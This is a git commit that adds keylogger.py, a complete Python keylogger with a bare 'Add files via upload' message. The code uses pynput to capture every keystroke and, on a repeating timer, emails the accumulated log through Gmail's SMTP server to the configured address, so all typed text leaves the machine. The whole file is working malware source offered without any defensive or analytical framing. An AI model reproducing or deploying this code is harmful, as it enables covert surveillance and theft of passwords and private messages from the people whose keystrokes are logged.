b59722796ed620460beb6bb13317c1a9c36bc67d
isaacnibeh <91464364+isaacnibeh@users.noreply.github.com>
2023-07-13 01:55:54 +0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,52 @@
+import smtplib
+
+import threading
+
+from pynput import keyboard
+
+class KeyLogger:
+    def __init__(self, time, email, password):
+        self.interval = time
+        self.log = "KeyLogger has started..."
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+
+    def on_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            elif key == key.esc:
+                print("Exiting program...")
+                return False
+            else:
+                current_key = " " + str(key) + " "
+
+        self.append_to_log(current_key)
+
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+
+    def report_n_send(self):
+        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report_n_send)
+        timer.start()
+
+
+    def start(self):
+        keyboard_listener = keyboard.Listener(on_press = self.on_press)
+        with keyboard_listener:
+            self.report_n_send()
+            keyboard_listener.join()
